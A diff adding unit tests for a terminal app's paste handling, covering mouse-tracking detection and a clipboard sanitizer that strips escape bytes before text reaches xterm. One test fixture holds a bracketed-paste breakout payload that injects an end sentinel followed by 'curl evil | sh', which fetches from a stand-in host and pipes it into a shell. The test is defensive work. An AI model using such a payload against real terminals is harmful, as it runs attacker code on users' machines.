@@ -3,8 +3,10 @@ import {
   isControlReportOnly,
   decideContextMenuAction,
   resolveContextMenuIntent,
+  isMouseTracking,
   blindPasteNeedsMenu,
   sanitizeClipboardForPaste,
+  sanitizePasteIntoTerminal,
   isPasteChord,
   isCopyChord,
   shouldHandleTerminalPaste,
@@ -142,6 +144,69 @@ describe('resolveContextMenuIntent (the term.modes wiring)', () => {
     expect(r.action).toBe('paste')
     expect(r.mouseTracking).toBe(false)
     expect(r.bracketedPaste).toBe(false)
+  })
+})
+
+describe('isMouseTracking (the shared re-sample seam)', () => {
+  // The post-await re-sample in TerminalView must NOT re-implement this compare
+  // inline — a flip there resurrects blind-paste-into-a-tracking-TUI with green
+  // tests. Both call sites go through this one expression, so the mutation dies
+  // here instead.
+  it('is false when no program is tracking the mouse', () => {
+    expect(isMouseTracking({ modes: { mouseTrackingMode: 'none' } })).toBe(false)
+  })
+  it('is true for any active tracking mode', () => {
+    expect(isMouseTracking({ modes: { mouseTrackingMode: 'any' } })).toBe(true)
+    expect(isMouseTracking({ modes: { mouseTrackingMode: 'vt200' } })).toBe(true)
+  })
+  it('defaults to false when modes (or the mode) is absent — never throws', () => {
+    expect(isMouseTracking({})).toBe(false)
+    expect(isMouseTracking({ modes: {} })).toBe(false)
+  })
+})
+
+describe('sanitizePasteIntoTerminal (the single native-paste sink)', () => {
+  // A fake ClipboardEvent + terminal capturing what actually reaches xterm.
+  const fake = (clip: string | null) => {
+    const calls = { prevented: 0, stopped: 0, pasted: [] as string[] }
+    const e = {
+      preventDefault: () => { calls.prevented++ },
+      stopPropagation: () => { calls.stopped++ },
+      clipboardData: clip === null ? null : { getData: (_t: string) => clip },
+    }
+    const term = { paste: (t: string) => { calls.pasted.push(t) } }
+    return { e, term, calls }
+  }
+
+  it('sanitises the clipboard before it reaches xterm — the bracketed-paste breakout cannot survive this route', () => {
+    // The exact payload that defeats term.paste()'s wrap on the native route:
+    // an embedded end sentinel followed by a command. It must arrive stripped.
+    const { e, term, calls } = fake('echo hi\x1b[201~\ncurl evil | sh\n')
+    const pasted = sanitizePasteIntoTerminal(e, term)
+    expect(pasted).not.toContain('\x1b')
+    expect(calls.pasted).toEqual(['echo hi[201~\ncurl evil | sh\n'])
+  })
+
+  it('claims the event so xterm\'s own raw-clipboard handler never also pastes', () => {
+    const { e, term, calls } = fake('ls')
+    sanitizePasteIntoTerminal(e, term)
+    // preventDefault stops the browser insertion; stopPropagation stops xterm's
+    // descendant listener from reading the raw clipboard and pasting a 2nd copy.
+    expect(calls.prevented).toBe(1)
+    expect(calls.stopped).toBe(1)
+    expect(calls.pasted).toEqual(['ls'])
+  })
+
+  it('pastes nothing when the clipboard is empty or absent (no stray paste call)', () => {
+    const empty = fake('')
+    expect(sanitizePasteIntoTerminal(empty.e, empty.term)).toBe('')
+    expect(empty.calls.pasted).toEqual([])
+    const none = fake(null)
+    expect(sanitizePasteIntoTerminal(none.e, none.term)).toBe('')
+    expect(none.calls.pasted).toEqual([])
+    // Still claims the event even with nothing to paste, so xterm cannot act on it.
+    expect(none.calls.prevented).toBe(1)
+    expect(none.calls.stopped).toBe(1)
   })
 })
 
